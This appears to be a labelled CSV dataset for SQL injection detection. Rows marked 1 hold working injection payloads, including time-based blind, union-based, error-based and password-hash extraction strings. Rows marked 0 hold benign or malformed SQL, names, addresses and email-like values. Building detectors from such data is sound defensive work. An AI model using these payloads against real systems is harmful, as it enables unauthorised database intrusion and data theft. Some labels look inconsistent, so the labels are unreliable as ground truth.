Query,Label
"1 where 7240 = 7240 or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",1
"SELECT support, our+ ', ' + political+ ' ' + fierce+ ', ' + shallow AS far FROM again",0
clech@ofertachina.lb,0
escenogrfica,0
SELECT option_value FROM wp_options WHERE option_name = '_options_youtube_url' LIMIT 1,0
SELECT sight FROM nine UNION ALL SELECT knew FROM lie ORDER BY aside,0
"1"" ) ) as ajwe where 1153 = 1153 rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) --",1
"SELECT standard,factory,lying FROM receive LEFT JOIN Orders ON dangerous.circusID = guess.sand ORDER BY us.stems",0
1'+ ( select taga where 8036 = 8036,1
alcoholado sabaters,0
SELECT COUNT ( depth ) FROM thousand,0
34855320q,0
"1' ) or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( 'cqrp' = 'cqrp",1
c/ nicolas salmeron 73,0
"1%"" ) ) ) or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --",1
"1' ) ) ) ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) and ( ( ( 'bvdw' = 'bvdw",1
46630334l,0
SELECT AVG ( share ) FROM mine SELECT SUM ( front ),0
hormilleja,0
SELECT pride ( s ) FROM enjoy INNER JOIN,0
1%' ) or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) and ( '%' = ',1
SELECT AVG ( relationship ) FROM when SELECT SUM ( consist ),0
1 ) ) as lkqx where 6468 = 6468 or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #,1
select * from users where id = 1 or 1 = 1 -- 1,1
SELECT * FROM salt WHERE center NOT LIKE 'breath%',0
1'+ ( select gqez where 3704 = 3704,1
tiena,0
SELECT * FROM war WHERE NOT rising = 'frame',0
arganza,0
"-4148%"" ) ) ) or ( 8459 = 8459 ) *4906 and ( ( ( ""%"" = """,1
acrianzada,0
casanellas berlingery,0
"UPDATE football SET offer = 'tomorrow', City = 'due' WHERE after = exchange",0
38348614r,0
SELECT * FROM level WHERE replace LIKE '%worry%',0
SELECT * FROM half WHERE NOT paper = 'crack',0
"1%"" ) union all select null,null,null,null,null,null,null,null--",1
"-4413%' ) ) union all select 1345,1345#",1
1'|| ( select 'ydvg' from dual where 7108 = 7108,1
hawker-wiese7@tradora.mg,0
3.05338E+15,0
1 ) where 5629 = 5629,1
"1%"" and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ""%"" = """,1
"-4136' ) ) as cczp where 7052 = 7052 union all select 7052,7052,7052,7052,7052,7052,7052,7052,7052,7052#",1
"1' ) and elt ( 4249 = 4249,7259 ) and ( 'bxnn' = 'bxnn",1
"SELECT select AS sail, native AS [boy] FROM principal",0
UEs,1
"SELECT * FROM mother WHERE improve BETWEEN ""greatest"" AND ""circle""",0
roquelina,0
"SELECT * FROM believed WHERE was IN ( 'canal', 'wall', 'excellent' )",0
SELECT * FROM market WHERE beautiful = 'thus' OR crowd = 'is',0
10328,0
"1"" ) ) ) rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) and ( ( ( ""tpxo"" like ""tpxo",1
"-5160' ) as kgjw where 9609 = 9609 union all select 9609,9609--",1
"SELECT * FROM call WHERE flight IN ( 'become', 'who', 'basket' )",0
"SELECT skill, from, thumb FROM street WHERE poetry IS NULL",0
select pg_sleep ( 5 ) and ( ( 'vxxg' = 'vxxg,1
"-2046' ) union all select 6668,6668--",1
"-1889%' ) ) ) or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( '%' = '",1
1 ) ) as prxq where 4600 = 4600,1
"SELECT swim, again, thrown FROM diameter WHERE driver IS NULL",0
1'|| ( select 'xdzp' from dual where 5786 = 5786 and ( 3020 = 3020 ) *6703 ) ||',1
SELECT * FROM account WHERE horn BETWEEN exciting09/01/1996frighten AND agree15/31/1996scientist,0
1' ) ) and 7533 = 7533 and ( ( 'gvoh' = 'gvoh,1
tsoucas,0
c/ cofa 39,0
adoree-halsted1@estoespresto.af,0
36930027p,0
canela,0
"1"" ) as jiyl where 4893 = 4893 union all select null,null,null,null,null#",1
"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ( 'qfls' = 'qfls",1
if ( 3392 = 4422 ) select 3392 else drop function xsqq--,1
"1' ) where 9304 = 9304 or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",1
-9197' ) or ( 6877 = 8010 ) *8010 and ( 'umwl' = 'umwl,1
61621455q,0
-7940' ) union all select 6024--,1
"1%"" ) ) ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) and ( ( ""%"" = """,1
SELECT glad ( s ) FROM curious,0
senen,0
"SELECT market, ever, control FROM slope WHERE material IS NULL",0
cabal urrupan,0
"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) and ( ( ( ""%"" = """,1
alcalde manuel de la pinta s/n 13?f,0
-3499' ) ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( 'nzap' like 'nzap,1
1' ) ) as xirr where 2425 = 2425,1
1%' ) or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --,1
"1' ) procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) and ( 'szib' like 'szib",1
1' ) ) as xqam where 6750 = 6750,1
"-5230"" ) or elt ( 1032 = 1032,3623 ) and ( ""aivb"" like ""aivb",1
1 ) ) as vryv where 5600 = 5600,1
"1 ) as kzyb where 7023 = 7023 and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1
"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ( ( ( ""%"" = """,1
3nmo08v16a,0
SELECT bound ( s FROM year RIGHT JOIN,0
1' ) and 6969 = ( select 6969 from pg_sleep ( 5 ) ) and ( 'nqol' = 'nqol,1
"calle tajo, 182,",0
SELECT * FROM fifteen WHERE stopped = 'rising' LIMIT 3,0
"SELECT column_name FROM table1 T1, table1 T2 WHERE condition ;",0
SELECT option_value FROM wp_options WHERE option_name = 'options_footer_button_1_text' LIMIT 1,0
sqlattempt1,1
1' and ( 3435 = 7210 ) *7210 and 'lxxt' = 'lxxt,1
SELECT * FROM coal ORDER BY beside DESC,0
SELECT DISTINCT free FROM them,0
SELECT book ( s ) FROM religious UNION,0
) or pg_sleep ( __TIME__ ) --,1
1'|| ( select 'mnvk' from dual where 4181 = 4181,1
SELECT AVG ( car ) FROM tea SELECT SUM ( this ),0
castilla s/n,0
1364,0
"1', ( select ( case when ( 1609 = 1609 ) then waitfor delay '0:0:5' else 1609* ( select 1609 from master..sysdatabases ) end ) )",1
SELECT * FROM rod WHERE official BETWEEN piano09/01/1996real AND minerals15/31/1996widely,0
SELECT * FROM kept FETCH FIRST 50 PERCENT ROWS ONLY,0
SELECT * FROM teacher WHERE calm BETWEEN 'accept' AND 'offer',0
duran manero,0
"1"" where 8016 = 8016",1
688,0
"1"" or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) and ""ekjs"" like ""ekjs",1
UPDATE settle SET feathers = 'motor'WHERE breathing = 'spent',0
SELECT AVG ( basket ) FROM problem,0
brbara,0
"1'|| ( select 'nfgq' where 1837 = 1837 and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1
"1' ) or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1
"SELECT SUBSTRING ( ""SQL Tutorial"", 5, 3 ) AS ExtractString;",0
SELECT * FROM finish 3 SELECT * FROM pale,0
"1"" and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ""rntg"" like ""rntg",1
81338514a,0
5.56194E+15,0
willie51,0
noel,0
-4428 ) or 3038 = 3038,1
70136564l,0
"SELECT Orders.yardrID, Employees.apartment, Employees.electricity FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID = Employees.peopleID ORDER BY Orders.callID",0
"select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ( ""%"" = """,1
SELECT * FROM flame WHERE book BETWEEN 10 AND 20,0
"calle pea de francia, 58,",0
"1 ) ) union all select null,null,null,null,null#",1
"select * from users where id = 1 or ""1{"" or 1 = 1 -- 1",1
-1760 ) ) ) or ( 8459 = 8459 ) *4906 and ( ( ( 1541 = 1541,1
-7720 ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( 8254 = 8254,1
SELECT * FROM pool FETCH FIRST 3 ROWS ONLY,0
-5299 or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ),1
SELECT COUNT ( DISTINCT pine ) FROM beauty,0
SELECT * FROM although 3,0
"-1106' ) ) union all select 2855,2855,2855,2855,2855,2855,2855#",1
SELECT map ( s ) FROM outside LEFT JOIN,0
SELECT AVG ( molecular ) FROM week SELECT SUM ( everywhere ),0
"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5#",1
waitfor delay '0:0:5' and 'dfzn' = 'dfzn,1
1'|| ( select 'hlxd' from dual where 2615 = 2615 and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) ||',1
-1587' ) or 8339 = 5540,1
SELECT MIN ( ground ) AS ship FROM sheep,0
"masia can giro, 5",0
"1' where 9222 = 9222 and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1
"1' in boolean mode ) and 8189 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1
4830,0
67242195q,0
SELECT statement ( s ) FROM nine FULL OUTER JOIN,0
SELECT * FROM grandfather WHERE policeman = 'small',0
3.89386E+15,0
"1' ) ) as qwdh where 7581 = 7581 or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1
"1' ) ) union all select null,null,null,null,null,null,null,null,null#",1
"SELECT giant AS rhyme, copper AS [particular] FROM loose",0
"-3782%"" ) or make_set ( 9354 = 9354,7185 ) and ( ""%"" = """,1
grea,0
SELECT TOP 50 PERCENT * FROM vote SELECT * FROM simplest FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM test,0
SELECT * FROM adjective WHERE larger IN ( SELECT tried FROM pond ),0
-1385' ) ) ) or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( ( ( 'mjjd' = 'mjjd,1
SELECT * FROM related WHERE along LIKE '%income%',0
"SELECT opinionID AS ID, sheet AS gray FROM wild",0
pe7tr0b9,0
SELECT sheet ( s ) FROM loss INNER JOIN,0
0x27 OR 0x31=0x31,1
SELECT AVG ( pale ) FROM suppose SELECT SUM ( drive ),0
"iif ( 9134 = 5736,1,1/0 )",1
"SELECT fly,shoe,city,shinning,claws ( ( surrounded JOIN find ON electric.alive = track.scene ) INNER JOIN underON Orders.welcome = arrangement.campID )",0
-2100' where 9260 = 9260 or 3038 = 3038,1
-2869' ) ) union all select 3216--,1
SELECT * FROM [Brazil Customers]; CREATE OR REPLACE VIEW [Brazil Customers] AS,0
"select count ( * ) from generate_series ( 1,5000000 ) and ( ( ( 'xori' like 'xori",1
SELECT * FROM college WHERE pink = 'piece' AND ( each = 'cause' OR divide = 'rather' ),0
"1"" and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and ""tqbi"" = ""tqbi",1
"1'|| ( select 'gwxc' from dual where 3626 = 3626 and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1
"1'|| ( select 'ryom' where 1134 = 1134 or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",1
SELECT species ( s ) FROM heart UNION ALL,0
"1"" ) or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ""ctrr"" = ""ctrr",1
SELECT AVG ( second ) FROM hill SELECT SUM ( brother ),0
1' ) as hwpf where 5603 = 5603,1
SELECT * FROM lonely ORDER BY poetry,0
1'|| ( select 'fjlg' from dual where 9517 = 9517,1
"antelo y mario, 192,",0
DELETE FROM wrong WHERE picture = 'dinner',0
armenteros,0
1'|| ( select 'ptkj' from dual where 6263 = 6263 union all select null--,1
select ( case when ( 2056 = 1917 ) then 2056 else 1/ ( select 0 ) end ) --,1
"-1083%"" ) ) ) or elt ( 1032 = 1032,3623 ) and ( ( ( ""%"" = """,1
1' in boolean mode ) order by 1#,1
limpi$aas,0
"1"" ) where 5938 = 5938 and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #",1
SELECT COUNT ( actually ) FROM brush,0
37110,0
"SELECT positive, buffalo, dried FROM bite WHERE where IS NULL",0
1 ) where 9649 = 9649 and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --,1
SELECT * FROM thought 3,0
SELECT * FROM furniture ORDER BY improve DESC,0
s3borrea,0
cabral_crowther@frioelectric.br,0
"1' or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) and 'esjl' = 'esjl",1
SELECT * FROM ( SELECT right FROM world ),0
"1"" ) where 1107 = 1107 and 8189 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1
SELECT * FROM breathing WHERE NOT author = 'salt',0
equiparable,0
select case when 4537 = 8418 then 1 else null end--,1
"-1908"" ) where 6420 = 6420 union all select 6420,6420,6420,6420--",1
SELECT * FROM pretty WHERE NOT combination = 'horn',0
"-6333"" ) ) ) union all select 9851,9851,9851,9851,9851,9851--",1
"SELECT COUNT ( voyage ) , idea FROM sad BY test",0
belia,0
a65esad0,0
SELECT * FROM several WHERE individual BETWEEN 10 AND 20,0
SELECT TOP 50 PERCENT * FROM locate SELECT * FROM death FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM greater,0
"1 ) ) as atiy where 3855 = 3855 and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --",1
"-2745' or elt ( 1032 = 1032,3623 )",1
19140,0
"union ( select NULL, NULL, NULL, NULL, NULL, ( select @@version ) ) --",1
"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ( ""gzhp"" = ""gzhp",1
"1"" ) where 3507 = 3507",1
10110,0
03307827j,0
c/ san ildefonso 106 10?h,0
"1%"" ) union all select null,null,null,null,null,null,null--",1
1'+ ( select 'rkap' where 9692 = 9692,1
SELECT * FROM wp_posts WHERE ID = 367848 LIMIT 1,0
claudino,0
SELECT AVG ( himself ) FROM tip SELECT SUM ( finger ),0
"1' ) ) as wves where 2641 = 2641 and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",1
86800649y,0
SELECT beauty ( s ) FROM locate SELECT modern ( s ),0
35231,0
SELECT TOP 3 * FROM bread WHERE automobile = 'building' SELECT * FROM sport,0
"-2855"" ) ) ) union all select 1496,1496,1496,1496#",1
SELECT * FROM function WHERE society NOT LIKE '[bad]%',0
1' ) ) as oyad where 7161 = 7161 and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) --,1
"1"" and 2006 = 2006",1
"1', ( select ( case when ( 3576 = 7744 ) then 1 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual )",1
SELECT COUNT ( noun ) FROM popular,0
g66uin2,0
empece9ora,0
"lugar higuera canaria, 169",0
tordera savall,0
1 ) as odqn where 3910 = 3910,1
"-2748' ) ) as gazw where 4624 = 4624 union all select 4624,4624#",1
1 ) ) order by 1#,1
"-5439"" or 2559 = 4692 and ""dcrf"" like ""dcrf",1
SELECT * FROM student WHERE third = 'mistake' OR came = 'seems',0
15495714q,0
"1"" where 6179 = 6179",1
1 and 2620 = 2175,1
SELECT MIN ( right ) AS wool FROM if,0
imokoude@transportesvegasl.et,0
SELECT option_value FROM wp_options WHERE option_name = '_options_location_address' LIMIT 1,0
-5327' ) ) ) or 1606 = 6099,1
"1 ) ) ) and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( 9184 = 9184",1
SELECT * FROM place WHERE finest = 'essential' LIMIT 3,0
SELECT TOP 3 * FROM saddle SELECT * FROM grow 3SELECT * FROM century,0
"1 union all select null,null,null#",1
gregonio,0
"1 ) ) union all select null,null,null,null,null,null#",1
31049,0
callosar,0
SELECT COUNT ( saved ) FROM wherever,0
"1"" ) ) ) and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( ( ( ""jmjr"" like ""jmjr",1
c/ doctores lasso simarro 30,0
"SELECT massage,built,enemy FROM order LEFT JOIN Orders ON immediately.religiousID = paragraph.although ORDER BY bee.desert",0
"1"" ) as fkgs where 5948 = 5948 or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",1
6745,0
"1'+ ( select 'arzm' where 6464 = 6464 or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) ) +'",1
1 ) ) rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) and ( ( 1476 = 1476,1
"select * from generate_series ( 5206,5206,case when ( 5206 = 2214 ) then 1 else 0 end ) limit 1--",1
SELECT * FROM house WHERE bridge BETWEEN sat09/01/1996thread AND nation15/31/1996daily,0
1 and 6969 = ( select 6969 from pg_sleep ( 5 ) ),1
1' ) ) as qgyz where 1547 = 1547 and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --,1
"SELECT Employees.individual, COUNT ( Orders.sourceID ) AS lionFROM ( OrdersINNER JOIN coal ON Orders.giantID = Employees.chiefID )",0
AND 1 = utl_inaddr.get_host_address ( ( SELECT COUNT ( DISTINCT ( PASSWORD ) ) FROM SYS.USER$ ) ) AND 'i' = 'i,1
WHERE ProductID = ANY ( SELECT ProductID FROM OrderDetails WHERE Quantity > 99 ) ;,0
"1%"" ) ) ) order by 1#",1
"1%"" ) ) and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( ( ""%"" = """,1
1' ) as xqbq where 1619 = 1619 and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) --,1
1.52349E+15,0
"1"" ) ) as sqow where 8752 = 8752",1
SELECT * FROM wave,0
SELECT giving ( s ) FROM this UNION,0
"-2325 ) union all select 4692,4692,4692,4692#",1
SELECT * FROM buffalo WHERE rest BETWEEN person09/01/1996meat AND touch15/31/1996copy,0
SELECT run ( s ) FROM moment UNION,0
1 ) as hvsk where 7902 = 7902,1
"select * from users where id = 1 or 1#"" ( union select null,version ( ) -- 1",1
1 ) ) as rroe where 4840 = 4840,1
SELECT COUNT ( properly ) FROM establish,0
SELECT * FROM per ORDER BY younger DESC,0
"1 and elt ( 4249 = 4249,7259 ) -- meef",1
1' ) where 3861 = 3861,1
casademonts,0
"1"" and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ""epxq"" like ""epxq",1
7.78503E+15,0
"SELECT * FROM today ORDER BY taught ASC, vast DESC",0
26256,0
deying,0
